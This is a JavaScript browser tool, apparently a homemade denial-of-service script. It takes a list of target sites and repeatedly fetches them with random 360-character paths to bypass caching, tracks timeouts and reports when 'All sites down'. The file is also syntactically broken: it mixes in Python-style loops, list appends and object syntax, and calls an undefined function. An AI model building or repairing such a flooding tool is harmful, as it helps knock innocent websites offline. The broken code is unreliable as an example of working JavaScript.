var go = true;

window.onload = function() {
	document.getElementById('stop').addEventListener('click', stop);
	document.getElementById('start').addEventListener('click', function() {
		if (document.getElementById('sites').value == '') {
			error('no sites provided');
			return;
		}

		log('Starting...');

		const sites = document.getElementById('sites').value.split(',');
		const length = document.getElementById('length').value;
		const times = document.getElementById('times').value;

		var i = 0;
		while (go == true && i < times) {
			log('starting to spam');
			startSpamSites(sites);

			i += 1;
			log('Requests sent: ' + i);
		}
	});

	log('hi');
}

// stop the program and let the user know
const stop = function() {
	go = false;
	log('Stopping...');
}

// provides easy logging to give information to the user
const log = function(text) {
	var textEl = document.createElement('p');
	textEl.innerText = text;

	document.getElementById('log').appendChild(textEl);
}

// logging for fatal errors
const error = function(text) {
	log('Error: ' + text);
	log('Halting program');
}


// 
// The actual spamming code
//

function timeout(ms, promise) {
	return new Promise(function(resolve, reject) {
		setTimeout(function() {
			reject(new Error("timeout"));
		}, ms);

		promise.then(resolve, reject);
	});
}


function randomString() {
	const chars = "1234567890QWERTYUIOASDFGHJKLPZXCVBNM";
	var randomString = "";
	for (var c = 0; c < 360; c++) {
		randomString += chars[Math.floor(Math.random() * chars.length)];
	}

	return randomString;
}

function nextSite(site, sitesLen) {
	site++;
	if (site == sitesLen) {
		site = 0;
	}
	return site
}

const getWebsites = function(sites) {
	var websites = [];

	for site in sites {
		websites.append({
			url = site,
			timeouts = 0,
		});
	}

	return websites
}

const startSpamSites = function(sites) {
	console.log('beggining the spamming process');
	spamSites(getWebsites(sites), 0, 0)
}

const spamSites = function(websites, site, i) {
	if (websites[site].timeouts > 5) {
		if (site == websites.length) {
          	console.log("All sites down");
			return;
		}	
		site++;
	}

	log(i);

	if (go == false) {
		return;
	}

	timeout(10000, fetch(websites[site].url + randomString())).then(result => {
		console.log(i, result);
		i++;
		
		setTimeout(function() {
			site = nextSite(site, websites.len);
			requester();
		}, 100);
	}).catch(function(error) {
		websites[site].timeouts++;
		console.log("Timeout error for " + websites[site].url);

		setTimeout(function() {
			site = nextSite(site, websites.len);
			spamSites(websites, site, i);
		}, 100);
	});
};

